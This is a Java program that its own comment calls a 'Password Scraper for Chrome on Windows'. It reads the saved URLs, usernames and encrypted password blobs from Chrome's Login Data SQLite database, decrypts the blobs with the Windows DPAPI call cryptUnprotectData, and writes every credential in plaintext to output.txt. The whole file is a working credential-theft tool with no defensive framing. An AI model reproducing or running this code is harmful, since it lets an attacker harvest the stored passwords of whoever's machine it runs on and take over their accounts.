import java.util.*;
import java.lang.Object;

import com.sun.jna.*;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.WinCrypt.DATA_BLOB;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.sql.DriverManager;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;

// Password Scraper for Chrome on Windows

public class jdec extends Crypt32Util {
	
	public static void main(String[] args) throws SQLException, FileNotFoundException, UnsupportedEncodingException{
		
		// Redirect output to text file
		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
		System.setOut(out);
		
		Connection conn = null;

		// Use arguments string for db url
		String url = "jdbc:sqlite:C:/Users/thoma/workspace/Crypt32Dec/src/logindata.db";
		conn = DriverManager.getConnection(url);
		
		// SQL Queries
		Statement stmt1 = conn.createStatement();
		Statement stmt2 = conn.createStatement();
		Statement stmt3 = conn.createStatement();
		Statement stmt4 = conn.createStatement();
		String sqlurls = "SELECT origin_url FROM logins";
		String sqlusernames = "SELECT username_value FROM logins";
		String sqlpassblobs = "SELECT password_value FROM logins";
		String count = "SELECT COUNT(username_value) FROM logins";
		ResultSet dbcount = stmt4.executeQuery(count);
		int cint = dbcount.getInt(1);
		
		ArrayList<byte[]> bytearray = new ArrayList<byte[]>();
		
		ResultSet rsurls = stmt1.executeQuery(sqlurls);
		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
		ResultSet rspassblobs = stmt3.executeQuery(sqlpassblobs);
		
		ResultSetMetaData rsmeta = rsurls.getMetaData();
		int numberofsets = rsmeta.getColumnCount();
		
		// URLs into String array
		int urint = 0;
		String[] urls = new String[cint];
		while(urint!=cint){
			urls[urint] = rsurls.getString(1);
			rsurls.next();
			urint++;
		}
		
		// Usernames into String array
		int unint = 0;
		String[] usernames = new String[cint];
		while(unint!=cint){
			usernames[unint] = rsusernames.getString(1);
			rsusernames.next();
			unint++;
		}
		
		int pint = 0;
		// Putting BLOBs into byte array
		while(pint!=cint){
			bytearray.add(rspassblobs.getBytes(1));
			rspassblobs.next();
			pint++;
		}
		
		
		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
		int x = 0;
		boolean work;
		Object NULL = null;
		
		// Decrypt data
		while(x != cint){
		unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
		x++;
		}
		
		// Put decrypted passwords into string array
		String[] passwords = new String[cint];
		for(int y = 0; y < cint; y++){
			passwords[y] = new String(unencrypted.get(y), "UTF-8");
		}
		
		// Print results
		for(int i = 0; i < cint; i++){
			System.out.println(urls[i] + " -- " + usernames[i] + " -- " + passwords[i]);
		}

	}
}
